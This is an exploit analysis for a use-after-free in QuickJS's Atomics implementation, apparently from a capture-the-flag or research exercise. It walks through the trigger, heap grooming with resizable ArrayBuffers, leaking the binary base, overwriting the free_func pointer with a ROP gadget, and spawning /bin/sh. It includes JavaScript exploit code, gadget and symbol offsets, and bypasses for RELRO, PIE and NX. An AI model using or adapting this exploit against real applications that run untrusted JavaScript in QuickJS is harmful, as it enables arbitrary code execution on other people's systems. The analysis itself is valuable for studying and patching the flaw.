# QuickJS Atomics UAF Exploit Analysis

## Vulnerability Overview

The vulnerability exists in QuickJS's `js_atomics_op()` function at `quickjs.c:58725`. The function implements Atomics operations (add, store, exchange, etc.) on SharedArrayBuffer/TypedArray.

### Root Cause

The vulnerable code captures a raw pointer to the TypedArray's backing buffer **before** calling `valueOf()` on the operand:

```c
// quickjs.c:58725 (simplified)
static JSValue js_atomics_op(...) {
    // 1. Get pointer to buffer data
    ptr = js_atomics_get_ptr(...);  // Captures raw pointer

    // 2. Convert operand - calls valueOf()!
    if (op == ATOMICS_OP_LOAD) {
        v = 0;
    } else {
        if (JS_ToBigInt64(ctx, &v, argv[2]))  // <- valueOf() called here
            return JS_EXCEPTION;
    }

    // 3. Use stale pointer for atomic operation
    switch(op | (size_log2 << 3)) {
        // ... operations on ptr ...
    }
}
```

If `valueOf()` resizes the ArrayBuffer, the backing store is reallocated:
- The old data region is freed
- New memory is allocated for the larger buffer
- The captured `ptr` now points to freed memory (use-after-free)

### Trigger Conditions

1. Create a resizable ArrayBuffer: `new ArrayBuffer(56, { maxByteLength: 65536 })`
2. Create a TypedArray view on it: `new BigInt64Array(ab)`
3. Call an Atomics function with a custom valueOf: `Atomics.add(view, idx, { valueOf: ... })`
4. In valueOf, resize the buffer: `ab.resize(32768)`

## Exploitation Strategy

### Target: Full RELRO Binary

With Full RELRO, the GOT is read-only. We cannot overwrite GOT entries. Instead, we target QuickJS's internal function pointers.

### JSArrayBuffer Structure

The `JSArrayBuffer` struct contains a `free_func` pointer at offset 48:

```c
typedef struct JSArrayBuffer {
    // ... flags and metadata ...
    uint8_t *data;              // offset 16
    size_t byte_length;         // offset 24
    size_t max_byte_length;     // offset 32
    void *opaque;               // offset 40
    JSFreeArrayBufferDataFunc *free_func;  // offset 48
} JSArrayBuffer;
```

When a JSArrayBuffer is garbage collected, `free_func` is called:
```c
abuf->free_func(rt, abuf->opaque, abuf->data);
// rdi = rt, rsi = opaque, rdx = data
```

### Exploitation Steps

#### Step 1: Leak Binary Base

1. Create a 56-byte resizable ArrayBuffer (matches JSArrayBuffer struct size)
2. Trigger UAF via resize in valueOf
3. Read from offset 48 (free_func field) via stale pointer
4. The JSArrayBuffer struct of a newly allocated buffer lands in freed space
5. Read `js_array_buffer_free` address, subtract known offset to get binary base

```javascript
let result = Atomics.add(view, 6, {  // index 6 = offset 48
    valueOf: function() {
        ab.resize(32768);  // Free old buffer
        // Allocate new ArrayBuffers - their structs land in freed space
        for (let j = 0; j < 50; j++) allocs.push(new ArrayBuffer(8));
        return 0n;
    }
});
// result contains js_array_buffer_free address
binaryBase = result - 0x14bc0n;
```

#### Step 2: Set Up Payload

Create victim ArrayBuffers with 64-byte data regions containing:
- `[0]`: execve@plt address
- `[0x20]`: "/bin/sh\0" string

```javascript
vView[0] = execvePlt;
vDV.setUint8(0x20, '/'.charCodeAt(0));
// ... rest of "/bin/sh\0"
```

#### Step 3: Corrupt free_func

Use UAF write to overwrite `free_func` with a gadget address:

```javascript
Atomics.store(triggerView, 6, {  // offset 48
    valueOf: function() {
        trigger.resize(32768);  // Free old buffer
        // Allocate victims with payload in their data buffers
        for (...) victims.push(new ArrayBuffer(64));
        return gadgetAddr;  // Write gadget to free_func
    }
});
```

### ROP Gadget

Found gadget at binary offset `0x36736`:
```asm
lea rdi, [rdx + 0x20]    ; rdi = data + 0x20 = pointer to "/bin/sh"
call qword ptr [rdx]      ; call [data] = call execve@plt
```

When the corrupted JSArrayBuffer is freed:
- `rdx` = data pointer (points to victim's 64-byte buffer)
- Gadget sets `rdi` = `data + 0x20` = `"/bin/sh"` string
- Gadget calls `[data]` = execve@plt
- Result: `execve("/bin/sh", ???, ???)` spawns a shell

### Key Addresses (PIE offsets)

| Symbol | Offset |
|--------|--------|
| js_array_buffer_free | 0x14bc0 |
| gadget (lea rdi; call [rdx]) | 0x36736 |
| execve@plt | 0x11410 |

## Mitigation Bypass

- **Full RELRO**: Bypassed by targeting internal function pointers (free_func) instead of GOT
- **PIE/ASLR**: Bypassed by leaking code pointer from freed memory
- **NX**: Bypassed using ROP gadget in binary
- **Stack Canary**: Not relevant (no stack buffer overflow)

## Impact

Successful exploitation allows arbitrary code execution by spawning a shell. The vulnerability can be triggered from JavaScript code, potentially affecting any application that evaluates untrusted JavaScript using QuickJS.
